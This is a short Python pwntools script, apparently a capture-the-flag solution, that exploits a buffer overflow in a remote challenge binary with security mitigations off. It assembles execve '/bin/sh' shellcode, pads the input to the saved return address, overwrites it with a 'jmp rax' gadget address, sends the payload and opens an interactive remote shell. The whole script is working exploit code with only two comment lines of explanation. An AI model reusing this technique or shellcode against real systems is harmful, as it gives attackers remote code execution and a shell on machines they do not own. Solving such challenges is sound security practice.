# Return to shellcode, note that rax stores the return address, all security mitigations are turned off
# Note that rax stores gets string address
from pwn import *
context.arch = 'amd64'
host = 'chals.bitskrieg.in'
port = 6001

address_jump_rax = 0x4010ac

shellcode = """
        mov rax, 59
        lea rdi, [rip + binsh]
        mov rsi, 0
        mov rdx, 0
        syscall
binsh:
        .string "/bin/sh"
"""
shellcode = asm(shellcode)
payload = shellcode + b'A' * (0x78 - 38) + p64(address_jump_rax)

p = remote(host=host, port=port)
p.sendline(payload)
p.interactive()
